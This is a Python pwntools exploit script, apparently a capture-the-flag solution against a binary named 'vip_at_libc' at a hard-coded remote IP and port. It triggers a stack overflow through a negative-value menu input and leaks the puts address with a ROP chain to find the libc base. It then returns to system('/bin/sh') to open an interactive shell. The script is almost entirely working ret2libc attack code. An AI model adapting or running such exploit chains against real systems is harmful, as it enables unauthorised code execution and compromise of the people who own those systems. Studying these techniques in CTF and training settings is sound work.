#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template '--host=51.254.39.184' '--port=1335' vip_at_libc
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vip_at_libc')
libc = ELF("libc.so.6")
rop = ROP(exe)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '51.254.39.184'
port = int(args.PORT or 1335)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

def get_to_overflow():
    io.sendlineafter(b"username:", b"A"*15)
    io.sendlineafter(b">", b"2")
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b">", b"-100000")
    io.sendlineafter(b">", b"3")
    io.sendlineafter(b">", b"1")
    io.sendlineafter(b">", b"4")

io = start()

get_to_overflow()

payload_leak = flat(
    b"A"*24,
    rop.find_gadget(["pop rdi", "ret"])[0],
    p64(exe.got["puts"]),
    p64(exe.plt["puts"]),
    p64(exe.symbols.main)       
)

io.sendlineafter(b">", payload_leak)
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
leak_puts = u64(io.recv(6).ljust(8, b"\x00"))
info("PUTS@GLIBC: " + str(hex(libc.symbols["puts"])))
info("Leaked libc puts address: " + hex(leak_puts))

libc.address = leak_puts - libc.symbols["puts"]
info("libc base @ %s" % hex(libc.address))


get_to_overflow()

payload_win = flat(
    b"A"*24,
    rop.find_gadget(["ret"])[0],
    rop.find_gadget(["pop rdi", "ret"])[0],
    p64(next(libc.search(b"/bin/sh"))),
    p64(libc.sym["system"]),
    p64(libc.sym["exit"]),
)

io.sendlineafter(b">", payload_win)


io.interactive()

